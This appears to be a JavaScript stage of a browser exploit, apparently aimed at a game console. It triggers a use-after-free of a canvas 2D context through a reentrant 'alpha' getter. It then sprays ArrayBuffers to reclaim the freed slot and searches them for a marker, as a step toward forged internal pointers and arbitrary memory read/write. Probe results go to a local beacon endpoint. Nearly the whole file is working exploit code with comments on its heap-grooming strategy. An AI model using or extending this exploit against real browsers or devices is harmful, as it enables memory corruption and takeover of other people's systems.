// Reclaim the freed CanvasRenderingContext2D with ArrayBuffers instead of canvas contexts.
//
// The alias stage proves two JS objects can share one live context, but a shared context is not yet a
// memory primitive. The context object itself is 768 bytes; if an ArrayBuffer of the same size class
// reclaims that slot, then the canvas APIs write into memory we can read and write as bytes from JS -
// which is the step needed to forge m_stateStack (offset +112) and turn this into arbitrary read/write.
//
// ASAN cannot answer this question: it quarantines freed allocations, so nothing can reclaim the slot.
// The console has no sanitizer and is therefore the only correct oracle here.
(function () {
  function send(t) { try { navigator.sendBeacon('/beacon', 'c015-' + t); } catch (e) {} }
  var f64 = new Float64Array(1), u8 = new Uint8Array(f64.buffer);

  function trigger() {
    var inner = null;
    var canvas = document.createElement('canvas');
    var opts = {};
    Object.defineProperty(opts, 'alpha', { get: function () { inner = canvas.getContext('2d'); return true; } });
    try { canvas.getContext('bitmaprenderer', opts); } catch (e) {}
    return inner;
  }

  // A double whose bytes are easy to recognise inside a byte buffer.
  var MARK = 1.2345678901234e-300;

  [[768, '768'], [1024, '1024'], [512, '512'], [2048, '2048']].forEach(function (pair) {
    var size = pair[0], label = pair[1];
    var inner = trigger();
    if (!inner) { send(label + ':no-ctx'); return; }

    // Reclaim with ArrayBuffers of this size class, pre-filled with a recognisable pattern.
    var bufs = [], views = [];
    for (var i = 0; i < 1200; i++) {
      var ab = new ArrayBuffer(size);
      var v = new Uint8Array(ab);
      v.fill(0x41);
      bufs.push(ab); views.push(v);
    }
    send(label + ':sprayed');

    // Write through the stale wrapper. If the slot is ours, this lands inside one of the buffers.
    var wrote = false;
    try { inner.lineWidth = MARK; wrote = true; } catch (e) { send(label + ':write-threw'); }

    if (wrote) {
      f64[0] = MARK;
      var b0 = u8[0], b1 = u8[1], b2 = u8[2], b3 = u8[3], b4 = u8[4], b5 = u8[5], b6 = u8[6], b7 = u8[7];
      var hit = -1, off = -1;
      for (var j = 0; j < views.length && hit < 0; j++) {
        var v2 = views[j];
        for (var k = 0; k + 7 < v2.length; k++) {
          if (v2[k] === b0 && v2[k+1] === b1 && v2[k+2] === b2 && v2[k+3] === b3 &&
              v2[k+4] === b4 && v2[k+5] === b5 && v2[k+6] === b6 && v2[k+7] === b7) { hit = j; off = k; break; }
        }
      }
      send(label + ':hit=' + hit + '@' + off);
    }
  });
  send('done');
})();
